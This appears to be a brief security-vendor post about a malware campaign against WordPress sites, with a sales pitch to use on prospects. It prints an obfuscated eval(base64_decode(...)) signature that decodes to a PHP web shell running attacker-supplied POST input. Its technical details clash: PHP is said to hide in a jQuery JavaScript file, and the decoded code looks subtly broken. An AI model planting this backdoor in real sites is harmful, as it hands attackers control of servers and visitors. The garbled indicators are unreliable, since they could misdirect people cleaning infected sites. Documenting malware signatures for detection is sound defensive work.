Title: Over 32,000 WordPress Sites Infected with the Balada Injector
Date: June 2024

We recently discovered a massive malware campaign targeting WordPress sites.
The malware typically hides in `wp-includes/js/jquery/jquery.min.js`.

The most common signature for this variant is:
```php
eval(base64_decode("aWYgKGlzc2V0KCRfUE9TVFsienoiXSkpIHsgZXZhbCgkc3RyaXBzbGFzaGVzKCRfUE9TVFsienoiXSkpOyB9"));
```

This campaign is highly aggressive and causes a cloaked redirect for users coming from Google search results. You can find proof by doing a `google_serp_spam` check or a `cloaked_redirect` curl simulation.
You can reach out to prospects with this hook: "Your customers are being redirected to scam sites from Google."

The scope of this outbreak is definitely global.
